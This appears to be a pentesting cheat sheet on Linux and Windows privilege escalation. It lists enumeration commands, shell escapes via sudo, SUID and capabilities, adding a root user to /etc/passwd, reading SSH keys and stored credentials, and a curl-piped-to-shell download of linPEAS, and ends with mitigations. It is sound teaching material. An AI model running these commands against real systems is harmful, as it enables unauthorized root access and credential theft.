# What is Privilege Escalation?

Privilege Escalation is the step where an attacker turns limited access into higher access. **Vertical** escalation means moving from a normal user to admin/root. **Horizontal** escalation means accessing another user of the same level. On a compromised host it usually means going from a low-privilege shell to `root` or `SYSTEM`.

## Two flavors

- **Vertical** - low-priv account to admin/root (misconfigured sudo, SUID binaries, kernel bugs)
- **Horizontal** - user A accessing user B's data at the same level (often an IDOR under the hood)

## Linux privilege escalation - full enumeration

```bash
# Who am I and what can I do
id
sudo -l                                  # commands you can run as root (check GTFOBins!)
groups                                   # docker/lxd/disk groups = instant root

# SUID / SGID binaries (run as the file owner)
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID

# Capabilities (fine-grained root powers)
getcap -r / 2>/dev/null                  # cap_setuid, cap_dac_read_search = win

# Scheduled tasks - writable scripts run by root
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron

# Writable files/dirs owned by root
find / -writable -type d 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Kernel & OS (for public exploits like DirtyPipe, DirtyCow, PwnKit)
uname -a
cat /etc/os-release

# Credentials lying around
grep -riE "password|secret|api[_-]?key" /var/www /home /etc 2>/dev/null
cat ~/.bash_history ~/.ssh/id_rsa 2>/dev/null
env
```

### Common Linux privesc techniques

```bash
# 1. sudo entry -> GTFOBins. Example: sudo find
sudo find . -exec /bin/sh \; -quit

# 2. SUID binary -> GTFOBins. Example: SUID bash
/bin/bash -p          # -p keeps euid=root if SUID set

# 3. Writable /etc/passwd -> add a root user
openssl passwd -1 -salt x pass123     # generate hash
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# 4. Capability cap_setuid on python
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

# 5. Cron job running a world-writable script -> edit it to add a reverse shell

# 6. PwnKit (CVE-2021-4034 pkexec) / DirtyPipe (CVE-2022-0847) if kernel vulnerable
```

## Windows privilege escalation - full enumeration

```powershell
whoami /priv                             # SeImpersonate/SeAssignPrimaryToken -> Potato attacks
whoami /groups
systeminfo                               # OS build + hotfixes (missing patches)

# Services - unquoted paths & weak permissions
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
Get-Service | Where-Object {$_.Status -eq "Running"}

# Stored credentials
reg query HKLM /f password /t REG_SZ /s
cmdkey /list
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# AlwaysInstallElevated (MSI as SYSTEM)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Common Windows privesc techniques

```text
- SeImpersonatePrivilege -> PrintSpoofer / GodPotato / JuicyPotato -> SYSTEM
- Unquoted service path -> drop a malicious exe in the path
- Weak service permissions -> sc config <svc> binpath= "cmd /c net user..."
- AlwaysInstallElevated -> msfvenom MSI runs as SYSTEM
- Missing patches -> Windows Exploit Suggester
```

## Tools

- [linPEAS / winPEAS](https://github.com/peass-ng/PEASS-ng) - automated privesc enumeration (run first)
- [GTFOBins](https://gtfobins.github.io/) - abuse sudo/SUID binaries (bookmark this)
- [LOLBAS](https://lolbas-project.github.io/) - living-off-the-land Windows binaries
- [pspy](https://github.com/DominicBreuker/pspy) - watch cron/processes without root
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) / [GodPotato](https://github.com/BeichenDream/GodPotato) - SeImpersonate to SYSTEM
- [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng)

```bash
# Run linPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Mitigation - the fix

- Apply **least privilege**; remove unnecessary sudo rules and SUID bits.
- Patch the OS and kernel promptly (PwnKit, DirtyPipe, Potato attacks).
- Quote service paths and lock down service permissions (Windows).
- Never store secrets in world-readable files, history, or the registry.
- Monitor for privilege changes and unusual `sudo`/service activity.

## Practice

- TryHackMe "Linux PrivEsc" and "Windows PrivEsc" rooms
- HackTheBox machines; [HackTricks privesc](https://book.hacktricks.xyz/)

## Deep dive

- [Privilege Escalation - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [HackTricks privilege escalation](https://book.hacktricks.xyz/)

## CWE

- CWE-269: Improper Privilege Management
- CWE-250: Execution with Unnecessary Privileges
